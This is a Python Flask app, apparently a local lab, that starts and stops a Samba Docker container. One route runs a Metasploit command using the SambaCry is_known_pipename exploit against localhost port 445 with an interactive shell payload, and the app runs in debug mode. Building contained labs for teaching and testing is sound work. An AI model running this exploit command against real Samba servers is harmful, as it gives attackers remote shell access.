import subprocess
import os
from flask import Flask, render_template, request

app = Flask(__name__)

# Fonction pour vérifier si le conteneur est en ligne
def check_container_status():
    try:
        result = subprocess.run(["docker", "ps", "-q", "-f", "name=samba"], stdout=subprocess.PIPE)
        return len(result.stdout) > 0  # Si le conteneur est en ligne, on renvoie True
    except subprocess.CalledProcessError:
        return False

# Fonction pour démarrer le conteneur Docker
def start_samba_container():
    try:
        subprocess.run(["docker-compose", "up", "-d"], check=True)
        return "Conteneur Samba lancé avec succès."
    except subprocess.CalledProcessError as e:
        return f"Erreur lors du lancement du conteneur: {e}"

# Fonction pour exploiter la vulnérabilité Samba
def exploit_samba():
    try:
        # Lancer Metasploit avec un terminal séparé en arrière-plan
        subprocess.run(["gnome-terminal", "--", "bash", "-c", "msfconsole -x 'use exploit/linux/samba/is_known_pipename; set RHOST 127.0.0.1; set RPORT 445; set payload cmd/unix/interact; exploit; exec bash'"], check=True)
        
        return "Exploitation réussie et terminal Metasploit ouvert!"
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exploitation: {e}"

# Fonction pour stopper le conteneur Samba
def stop_samba_container():
    try:
        subprocess.run(["docker-compose", "down"], check=True)
        return "Conteneur Samba arrêté avec succès."
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'arrêt du conteneur: {e}"

@app.route('/')
def index():
    # Vérifie si le conteneur est en ligne
    container_status = check_container_status()
    return render_template('index.html', container_status=container_status)

@app.route('/start_samba', methods=['POST'])
def start_samba():
    message = start_samba_container()
    return render_template('index.html', message=message, container_status=True)

@app.route('/exploit_samba', methods=['POST'])
def exploit():
    message = exploit_samba()
    return render_template('index.html', message=message, container_status=True)

@app.route('/stop_samba', methods=['POST'])
def stop_samba():
    message = stop_samba_container()
    return render_template('index.html', message=message, container_status=False)

if __name__ == '__main__':
    app.run(debug=True)
